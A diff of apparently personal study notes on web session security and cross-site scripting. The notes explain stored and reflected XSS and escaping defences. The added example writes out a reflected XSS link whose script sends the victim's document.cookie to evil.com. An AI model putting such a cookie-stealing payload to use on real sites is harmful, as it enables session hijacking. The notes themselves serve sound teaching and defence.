@@ -4,14 +4,14 @@
 
 **Session token theft vulnerabilities**
 1. Predictable tokens - attacker can guess the token - Cookies should be unpredictable
-2. HTTPS/HTTP - site has mixed HTTPS/HTTP pages and token is sent of HTTP and so can be read in plaintext - set Secure attribute so cookies are only sent over TLS - Always issue new session token when raising user from being anonymous (possibly over HTTP to authenticated over HTTPS)
+2. HTTPS/HTTP - site has mixed HTTPS/HTTP pages and token is sent of HTTP and so can be read in plaintext - set **Secure** attribute so cookies are only sent over TLS - Always issue new session token when raising user from being anonymous (possibly over HTTP to authenticated over HTTPS)
 3. Cross site scripting
 4. Cross-site request forgeries
 
 ## XSS Attacks
 **Cross Site Scripting** XSS attacks are type of injection, in which malicious scripts are injected into otherwise benign and trusted web sites.
 
-- EXAMPLE
+![[Pasted image 20230406121442.png]]
 
 This would mean the JS has the permissions from the original server's data sent over for example with the origin of the service server. So they have access to the DOM etc.
 
@@ -30,16 +30,26 @@ There are two types of XSS attacker **reflected XSS** and **stored XSS**.
 ### Stored XSS Attacks
 The injected script is **permanently stored on the target servers** such as in a database in a message forum visitor log comment field etc. An example of this is customizing homepages on Social Media apps. The victim retrieves the malicious script from the server when it requests the stored information. The browser just runs the script within the context f $bank.com$.
 
+![[Pasted image 20230406122510.png]]
+
 ### Reflected XSS Attacks
 The **injected script is reflected off the web server** e.g. in an error message, search result, that includes part of the request. Reflected attacks are deliver to victims via another rout such as an email message of on other web message.
 
 The JS is not stored we just trick the victim into visiting an displaying some code. 
 
+![[Pasted image 20230406122529.png]]
+
 So this happens when some sort of user input is echoed into the browser without protection. **ALWAYS USE PROTECTION!**.
 
 ### XSS Example
 
-...
+![[Pasted image 20230406123058.png]]
+
+1. Alice visits $evil.com$ which contains the link "https://victim_site.com/search.php?term=\<script\> widow.location='http://evil.com/?c='document.cookie\<\/script\>"
+2. Alice clicks the link
+3. Alice's browser send of the term.
+4. The victim cite returns a script containing the $term as the script tag.
+5. Now authenticated the cookie is sent to $evil.com$
 
 ### XXS Defence
 The problem is **user supplied input**. One defence is **escaping**. Before we serve the HTTP response so that the browser only interprets them as a string.  But this doesn't always work and there are many ways t introduce JS.
@@ -52,3 +62,6 @@ The problem is **user supplied input**. One defence is **escaping**. Before we s
 
 ##### RAW vs. Escaped Output
 Escaping removes dangerous character and makes them only interpretable as text rather than parts of tags for example.
+
+[[[Cross Site Scripting Questions]]]
+
